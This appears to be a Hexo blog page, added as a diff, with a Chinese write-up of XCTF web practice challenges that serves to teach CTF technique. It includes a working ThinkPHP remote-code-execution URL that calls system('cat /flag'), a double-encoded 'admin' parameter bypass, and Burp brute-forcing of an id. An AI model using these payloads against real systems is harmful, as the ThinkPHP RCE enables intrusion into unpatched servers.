@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>攻防世界web进阶 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="baby_web我们点击题目场景，发现跳转到1.php  查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。 F12进入开发者模式，查看网络模块：  我们可以看到flag就在其中，同时发现网页跳转的原因就是location指向文件1.php。 sp：location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界web进阶">
+<meta property="og:url" content="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="baby_web我们点击题目场景，发现跳转到1.php  查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。 F12进入开发者模式，查看网络模块：  我们可以看到flag就在其中，同时发现网页跳转的原因就是location指向文件1.php。 sp：location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/.com//6.png">
+<meta property="og:image" content="http://example.com/.com//7.png">
+<meta property="og:image" content="http://example.com/.com//8.png">
+<meta property="og:image" content="http://example.com/.com//9.png">
+<meta property="og:image" content="http://example.com/.com//10.png">
+<meta property="og:image" content="http://example.com/.com//11.png">
+<meta property="og:image" content="http://example.com/.com//12.png">
+<meta property="article:published_time" content="2021-03-12T09:23:20.000Z">
+<meta property="article:modified_time" content="2021-03-18T08:55:56.833Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-攻防世界web进阶" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/" class="article-date">
+  <time datetime="2021-03-12T09:23:20.000Z" itemprop="datePublished">2021-03-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻防世界web进阶
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h1><p>我们点击题目场景，发现跳转到1.php</p>
+<p><img src="/.com//1.png" alt="1"></p>
+<p>查阅资料发现一般网站的初始页面都是index.php，于是在url中输入index.php，但是又自动跳转到1.php。</p>
+<p>F12进入开发者模式，查看网络模块：</p>
+<p><img src="/.com//2.png" alt="2"></p>
+<p>我们可以看到flag就在其中，同时发现网页跳转的原因就是<code>location</code>指向文件1.php。</p>
+<p><strong>sp：</strong>location——用于重定向一个新的位置，包含一个新的url。表示用户应当到指定地址提取文件。</p>
+<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>本题主要考察对robots.txt的了解和作用。</p>
+<p><strong>robots.txt文件</strong>是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它  。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。Robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p>
+<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p>
+<ul>
+<li><p>打开题目地址，看到这是一个对robots.txt的简介<img src="/.com//3.png" alt="3"></p>
+</li>
+<li><p>访问一下这个网站的robots.txt</p>
+</li>
+</ul>
+<p><img src="/.com//4.png" alt="4"></p>
+<ul>
+<li>网站不让我们访问这个fl0g.php，那我们就偏访问<img src="/.com//5.png" alt="5"></li>
+</ul>
+<p>​       发现flag，收工</p>
+<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>没搞懂</p>
+<p><a target="_blank" rel="noopener" href="http://111.200.241.244:42333/?s=/index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=cat%20/flag">http://111.200.241.244:42333/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</a></p>
+<h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>进入题目页面<img src="/.com//6.png" alt="6"></p>
+<p>查看网页源码、回显都没有什么线索，查阅资料得知我们可以通过phps查看php源码。</p>
+<p>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。</p>
+<p><img src="/.com//7.png" alt="7"></p>
+<p>查看该页面源码：<img src="/.com//8.png" alt="8"></p>
+<p>代码审计可知，当id=admin时不会爆flag，但是当admin经过编码后可得flag</p>
+<p>由于本关url解码了两次（浏览器上传服务器一次，urldecode函数一次），因此我们可以构造?id=%2561dmin</p>
+<p><img src="/.com//9.png" alt="9"></p>
+<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06:"></a>ics-06:</h1><p><img src="/.com//10.png" alt="10"></p>
+<p>我们根据题目提示打开报表中心<img src="/.com//11.png" alt="11"></p>
+<p>我们可以看到id=1，那会不会是参数有问题呢</p>
+<p>用burp抓包，对id进行爆破，发现当id=2333时爆出flag<img src="/.com//12.png" alt="12"></p>
+<p>但是这题有一点不明白，就是为什么题目说：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。为什么痕迹是id的值？</p>
+<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45844670/article/details/108180309">https://blog.csdn.net/weixin_45844670/article/details/108180309</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/" data-id="ckmenmra3000bncvubn5q2y1s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/13/DVWA%E2%80%94XSS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DVWA—XSS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DVWA—Weak Session IDs</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HPPT/" rel="tag">HPPT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 15px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 17.5px;">DVWA-labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 10px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/16/bugku/">bugku(1)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/13/DVWA%E2%80%94XSS/">DVWA—XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/">攻防世界web进阶</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/DVWA%E2%80%94Weak%20Session%20IDs/">DVWA—Weak Session IDs</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/12/DVWA%E2%80%94File%20Uplod/">DVWA—File Uplod</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
